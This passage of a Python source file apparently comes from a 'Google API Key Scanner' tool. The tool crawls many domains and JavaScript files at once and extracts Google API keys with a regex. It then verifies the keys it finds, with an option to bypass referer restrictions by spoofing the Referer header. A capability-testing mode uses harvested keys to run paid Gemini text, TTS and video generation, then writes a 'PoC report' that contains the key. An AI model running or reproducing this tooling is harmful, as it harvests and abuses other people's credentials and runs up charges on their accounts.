            c = _est_video(5)
            total_cost += c
            rows.append({"Capability": "Video", "Unit": "5 seconds",
                         "Cost": f"${c:.2f}", "Notes": "Veo 3 Fast (paid)"})
        else:
            ColoredOutput.warning("Video generation : Failed / Not supported")

    W2 = term_width()
    print(f"\n{Fore.CYAN}{'='*W2}")
    print(f"{Fore.YELLOW}  IMPACT ESTIMATE (Illustrative)")
    print(f"{Fore.CYAN}{'='*W2}{Style.RESET_ALL}")
    if rows:
        headers = ["Capability", "Unit", "Cost", "Notes"]
        cw = {h: len(h) for h in headers}
        for r in rows:
            for h in headers:
                cw[h] = max(cw[h], len(r[h]))
        def _fmt(r):
            return " | ".join(r[h].ljust(cw[h]) for h in headers)
        print(_fmt({h: h for h in headers}))
        print("-+-".join("-" * cw[h] for h in headers))
        for r in rows:
            print(_fmt(r))
        ColoredOutput.success(f"Estimated total (this run): ${total_cost:.4f}")
        print(f"  Pricing source: https://ai.google.dev/gemini-api/docs/pricing")
    else:
        ColoredOutput.warning("No capabilities were successfully tested.")

    cap_list = "\n".join(f"- {r['Capability']}" for r in rows) if rows else "- (none confirmed)"
    md_rows  = [f"| {r['Capability']} | {r['Unit']} | {r['Cost']} | {r['Notes']} |"
                for r in rows] if rows else ["| — | — | — | — |"]
    pricing_md = "\n".join(
        ["| Capability | Unit | Cost | Notes |", "| --- | --- | --- | --- |"] + md_rows
    )
    ev_list = "\n".join(f"- {f}" for f in evidence_files) if evidence_files else "- (none generated)"

    report_txt = _CAPABILITY_REPORT.format(
        date_utc        = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
        api_key         = api_key,
        capabilities_list = cap_list,
        gemini_base     = _GEMINI_BASE,
        text_model      = text_model,
        tts_model       = tts_model,
        pricing_table   = pricing_md,
        total_cost      = total_cost,
        evidence_list   = ev_list,
    )

    report_path = os.path.join(out_dir, "report.md")
    try:
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(report_txt)
        ColoredOutput.success(f"PoC report saved : {report_path}")
    except Exception as e:
        ColoredOutput.error(f"Failed to save report: {e}")

    print(f"{Fore.MAGENTA}{'═'*W2}{Style.RESET_ALL}\n")



def print_help():
    W = term_width() - 2
    help_text = f"""
{Fore.CYAN}┌{'─'*W}┐
{Fore.CYAN}│{Fore.YELLOW}{'QUICK START GUIDE':^{W}}{Fore.CYAN}│
{Fore.CYAN}└{'─'*W}┘{Style.RESET_ALL}

{Fore.YELLOW}STEP 1: SCAN FOR API KEYS{Style.RESET_ALL}

   {Fore.GREEN}Scan single domain:{Style.RESET_ALL}
   {Fore.WHITE}python Gemisc.py -t example.com{Style.RESET_ALL}

   {Fore.GREEN}Scan from file:{Style.RESET_ALL}
   {Fore.WHITE}python Gemisc.py -f domains.txt{Style.RESET_ALL}

{Fore.YELLOW}STEP 2: VERIFY FOUND KEYS{Style.RESET_ALL}

   {Fore.GREEN}Check keys for vulnerabilities:{Style.RESET_ALL}
   {Fore.WHITE}python Gemisc.py -l results.txt --verify{Style.RESET_ALL}

{Fore.CYAN}{'='*term_width()}{Style.RESET_ALL}
"""
    print(help_text)

def draw_menu():
    W = term_width() - 2
    title_text = "  GOOGLE API KEY SCANNER  "
    title_pad = max(0, W - len(title_text))
    left_p = title_pad // 2
    right_p = title_pad - left_p

    print(f"\n{Fore.CYAN}┌{'─'*W}┐{Style.RESET_ALL}")
    print(f"{Fore.CYAN}│{Style.RESET_ALL}{' '*left_p}{Fore.YELLOW}{Style.BRIGHT}{title_text}{Style.RESET_ALL}{' '*right_p}{Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}├{'─'*W}┤{Style.RESET_ALL}")

    options = [
    ("1", "[*]", "Single Target Scan",    "# Scan a single domain or URL",              Fore.GREEN),
    ("2", "[F]", "Batch Scan (File)",     "# Scan multiple targets from a file",        Fore.GREEN),
    ("3", "[J]", "JS File Scanner",       "# Scan JS file URLs from a file",            Fore.CYAN),
    ("4", "[V]", "API Key Validation",    "# Validate and test API keys",               Fore.YELLOW),
    ("5", "[C]", "Capability Testing",    "# Test what a Gemini key can generate",      Fore.MAGENTA),
    ("6", "[X]", "Exit",                  "",                                           Fore.RED),
]
    for num, icon, title, desc, color in options:
        left_part  = f"  [{num}]  {icon}  {title}"
        right_part = desc
        inner_w    = W
        if desc:
            gap = max(1, inner_w - len(left_part) - len(right_part))
            visible = left_part + ' ' * gap + right_part
            row = (
                f"  {color}{Style.BRIGHT}[{num}]{Style.RESET_ALL}"
                f"  {color}{icon}{Style.RESET_ALL}"
                f"  {Style.BRIGHT}{title}{Style.RESET_ALL}"
                f"{' '*gap}"
                f"{Fore.WHITE}{desc}{Style.RESET_ALL}"
            )
        else:
            gap = max(0, inner_w - len(left_part))
            row = (
                f"  {color}{Style.BRIGHT}[{num}]{Style.RESET_ALL}"
                f"  {color}{icon}{Style.RESET_ALL}"
                f"  {Style.BRIGHT}{title}{Style.RESET_ALL}"
                f"{' '*gap}"
            )
        print(f"{Fore.CYAN}│{Style.RESET_ALL}{row}{Fore.CYAN}│{Style.RESET_ALL}")

    print(f"{Fore.CYAN}└{'─'*W}┘{Style.RESET_ALL}\n")


def ask(prompt, default=None):
    suffix = f" [{Fore.YELLOW}{default}{Style.RESET_ALL}]" if default else ""
    try:
        val = input(f"  {Fore.CYAN}➤{Style.RESET_ALL}  {prompt}{suffix}: ").strip()
        return val if val else default
    except (EOFError, KeyboardInterrupt):
        print()
        return None


def interactive_menu():
    draw_menu()
    try:
        choice = input(f"  {Fore.YELLOW}➤  Select option [1-6]: {Style.RESET_ALL}").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None, None, None, None, None

    config = Config()
    print()

    if choice == '1':
        target = ask("Enter target domain")
        if not target: return None, None, None, None, None
        output = ask("Output file", "results.txt")
        if not output: return None, None, None, None, None
        return 'single', target, output, config, ''

    elif choice == '2':
        file = ask("Enter domains file path")
        if not file: return None, None, None, None, None
        output = ask("Output file", "results.txt")
        if not output: return None, None, None, None, None
        return 'file', file, output, config, ''

    elif choice == '3':
        file = ask("Enter JS URLs file path")
        if not file: return None, None, None, None, None
        output = ask("Output file", "results.txt")
        if not output: return None, None, None, None, None
        return 'jsfile', file, output, config, ''

    elif choice == '4':
        W = term_width() - 2
        print(f"")
        print(f"{Fore.CYAN}┌{'─'*W}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.YELLOW}{Style.BRIGHT}[A]{Style.RESET_ALL}  With 403 Bypass (Referer Spoof){Fore.WHITE}   # Test if key works via domain referer spoof{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.YELLOW}{Style.BRIGHT}[B]{Style.RESET_ALL}  Without Bypass (Direct Test)   {Fore.WHITE}   # Test key directly without any spoof{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*W}┘{Style.RESET_ALL}")
        print()
        sub = ask("Select [A/B]")
        if not sub: return None, None, None, None, None
        sub = sub.strip().upper()

        if sub == 'A':
            domain = ask("Enter domain where you found this API key (for referer spoof)")
            if not domain: return None, None, None, None, None
            key_file = ask("Enter keys file path")
            if not key_file: return None, None, None, None, None
            output = ask("Output file", "vulnerable.txt")
            if not output: return None, None, None, None, None
            return 'verify', key_file, output, config, domain
        elif sub == 'B':
            key_file = ask("Enter keys file path")
            if not key_file: return None, None, None, None, None
            output = ask("Output file", "vulnerable.txt")
            if not output: return None, None, None, None, None
            return 'verify', key_file, output, config, ''
        else:
            ColoredOutput.error("Invalid choice. Run again.")
            return None, None, None, None, None

    elif choice == '5':
        W = term_width() - 2
        print(f"{Fore.CYAN}┌{'─'*W}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.MAGENTA}{Style.BRIGHT}[A]{Style.RESET_ALL}  Single API Key      {Fore.WHITE}   # Paste a single API key to test{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Style.RESET_ALL}  {Fore.MAGENTA}{Style.BRIGHT}[B]{Style.RESET_ALL}  API Key List (File) {Fore.WHITE}   # Load a file containing API keys{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*W}┘{Style.RESET_ALL}")
        print()
        sub = ask("Select [A/B]")
        if not sub: return None, None, None, None, None
        sub = sub.strip().upper()

        if sub == 'A':
            api_key = ask("Enter API key")
            if not api_key: return None, None, None, None, None
            return 'capability_single', api_key, '', config, ''
        elif sub == 'B':
            key_file = ask("Enter API keys file path")
            if not key_file: return None, None, None, None, None
            return 'capability_file', key_file, '', config, ''
        else:
            ColoredOutput.error("Invalid choice. Run again.")
            return None, None, None, None, None

    elif choice == '6':
        return None, None, None, None, None
    else:
        ColoredOutput.error("Invalid choice. Run again.")
        return None, None, None, None, None


def run_scan(targets, output, config, quiet=False):
    import threading

    scanner = APIScanner(config, quiet_mode=quiet)
    total = len(targets)

    WORKERS        = 100
    BATCH_SIZE     = 500
    DOMAIN_TIMEOUT = 30    
    BATCH_TIMEOUT  = 120   

    def process_with_timeout(domain):
        def _run():
            try:
                scanner.process_domain(domain)
            except Exception:
                pass
        t = threading.Thread(target=_run, daemon=True)
        t.start()
        t.join(timeout=DOMAIN_TIMEOUT)

    with tqdm(total=total, desc="Progress", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:

        for batch_start in range(0, total, BATCH_SIZE):
            batch = targets[batch_start: batch_start + BATCH_SIZE]

            with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
                future_map = {executor.submit(process_with_timeout, d): d for d in batch}
                batch_pending = dict(future_map)
                batch_done = 0
                batch_total = len(batch)

                while batch_done < batch_total and batch_pending:
                    done_set, _ = concurrent.futures.wait(
                        list(batch_pending.keys()),
                        timeout=BATCH_TIMEOUT,
                        return_when=concurrent.futures.FIRST_COMPLETED
                    )

                    if done_set:
                        for future in done_set:
                            try:
                                future.result(timeout=1)
                            except Exception:
                                scanner.stats['errors'] += 1
                            finally:
                                batch_pending.pop(future, None)
                                batch_done += 1
                                pbar.update(1)
                    else:
                        remaining = len(batch_pending)
                        for f in list(batch_pending.keys()):
                            f.cancel()
                            scanner.stats['errors'] += 1
                        batch_pending.clear()
                        pbar.update(remaining)
                        break

    print()
    
    unique_findings = []
    seen = set()
    for f in scanner.all_findings:
        if f['key'] not in seen:
            seen.add(f['key'])
            unique_findings.append(f)

    scanner.stats['total_findings'] = len(unique_findings)
    return scanner, unique_findings


def main():
    import sys

    if '--help' in sys.argv or '-h' in sys.argv:
        ColoredOutput.print_banner()
        print_help()
        return

    parser = argparse.ArgumentParser(add_help=False, description='Google API Key Scanner & Verifier')
    scan_group = parser.add_mutually_exclusive_group(required=False)
    scan_group.add_argument('-t', '--target', help='Single domain/URL to scan')
    scan_group.add_argument('-f', '--file', help='File with domains/URLs to scan')
    parser.add_argument('-l', '--list', dest='key_file', help='File with API keys to verify')
    parser.add_argument('--verify', action='store_true', help='Enable verify mode')
    parser.add_argument('-o', '--output', required=False, default='results.txt', help='Output file')
    parser.add_argument('--timeout', type=int, default=8, help='Request timeout seconds')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')

    args = parser.parse_args()
    ColoredOutput.print_banner()

    config = Config()
    config.TIMEOUT = args.timeout

    no_args = not args.target and not args.file and not args.key_file and not args.verify
    if no_args:
        mode, value, output, config, domain = interactive_menu()
        if mode is None:
            return

        config.OUTPUT_DIR = Path(output).parent if Path(output).parent != Path('.') else Path('.')

        if mode == 'verify':
            run_verify(value, output, domain)
            return

        if mode == 'capability_single':
            run_capability_test(value)
            return

        if mode == 'capability_file':
            key_pattern = re.compile(r'AIza[0-9A-Za-z_-]{35}')
            fpath = Path(value)
            if not fpath.exists():
                ColoredOutput.error(f"File not found: {value}")
                return
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as kf:
                keys = list(set(key_pattern.findall(kf.read())))
            if not keys:
                ColoredOutput.warning("No API keys found in file.")
                return
            ColoredOutput.info(f"Loaded {Fore.YELLOW}{len(keys)}{Style.RESET_ALL} unique key(s)")
            for k in keys:
                run_capability_test(k)
            return

        if mode == 'single':
            targets = [value.strip()]
            ColoredOutput.info(f"Scanning: {Fore.YELLOW}{value}{Style.RESET_ALL}")
        elif mode in ('file', 'jsfile'):
            input_file = Path(value)
            if not input_file.exists():
                ColoredOutput.error(f"File not found: {value}")
                return
            with open(input_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            ColoredOutput.info(f"Loaded {Fore.YELLOW}{len(targets)}{Style.RESET_ALL} targets")

        ColoredOutput.info(f"Output: {Fore.YELLOW}{output}{Style.RESET_ALL}\n")
        ColoredOutput.success("Scan starting...\n")
        scanner, all_findings = run_scan(targets, output, config, quiet=False)

        if all_findings:
            saved_file = scanner.save_results(all_findings, output)
            ColoredOutput.success(f"{len(all_findings)} API key(s) found and saved!")
        else:
            ColoredOutput.warning("No Google API keys found.")

        scanner.generate_report()

        if all_findings:
            try:
                import sys
                sys.stdin.flush()
                print(f"\n{Fore.YELLOW}Do you want to verify all keys now? (yes/no): {Style.RESET_ALL}", end="", flush=True)
                user_input = input().strip().lower()
                if user_input in ['yes', 'y']:
                    print(f"\n{Fore.CYAN}Starting verification...{Style.RESET_ALL}\n")
                    run_verify(saved_file, "vulnerable.txt")
                else:
                    print(f"\n{Fore.CYAN}Run manually:{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}python Gemisc.py -l {saved_file} --verify{Style.RESET_ALL}\n")
            except (EOFError, KeyboardInterrupt):
                print(f"\n{Fore.YELLOW}Skipping verification.{Style.RESET_ALL}\n")

    else:
        output = args.output
        config.OUTPUT_DIR = Path(output).parent if Path(output).parent != Path('.') else Path('.')

        if args.verify:
            if not args.key_file:
                ColoredOutput.error("Use: python Gemisc.py -l <file> --verify -o")
                return
            run_verify(args.key_file, output)
            return

        if not args.file and not args.target:
            ColoredOutput.error("Use: python Gemisc.py -t <domain> OR -f <file>")
            print_help()
            return

        if args.target:
            targets = [args.target.strip()]
            ColoredOutput.info(f"Scanning: {Fore.YELLOW}{args.target}{Style.RESET_ALL}")
        else:
            input_file = Path(args.file)
            if not input_file.exists():
                ColoredOutput.error(f"File not found: {args.file}")
                return
            with open(input_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            ColoredOutput.info(f"Loaded {Fore.YELLOW}{len(targets)}{Style.RESET_ALL} targets")

        ColoredOutput.info(f"Output: {Fore.YELLOW}{output}{Style.RESET_ALL}\n")
        ColoredOutput.success("Scan starting...\n")
        scanner, all_findings = run_scan(targets, output, config, quiet=args.quiet)

        if all_findings:
            saved_file = scanner.save_results(all_findings, output)
            ColoredOutput.success(f"{len(all_findings)} API key(s) found and saved!")
        else:
            ColoredOutput.warning("No Google API keys found.")

        scanner.generate_report()

        if all_findings:
            try:
                import sys
                sys.stdin.flush()
                print(f"\n{Fore.YELLOW}Do you want to verify all keys now? (yes/no): {Style.RESET_ALL}", end="", flush=True)
                user_input = input().strip().lower()
                if user_input in ['yes', 'y']:
                    print(f"\n{Fore.CYAN}Starting verification...{Style.RESET_ALL}\n")
                    run_verify(saved_file, "vulnerable.txt")
                else:
                    print(f"\n{Fore.CYAN}Run manually:{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}python Gemisc.py -l {saved_file} --verify{Style.RESET_ALL}\n")
            except (EOFError, KeyboardInterrupt):
                print(f"\n{Fore.YELLOW}Skipping verification.{Style.RESET_ALL}\n")

if __name__ == "__main__":
    main()
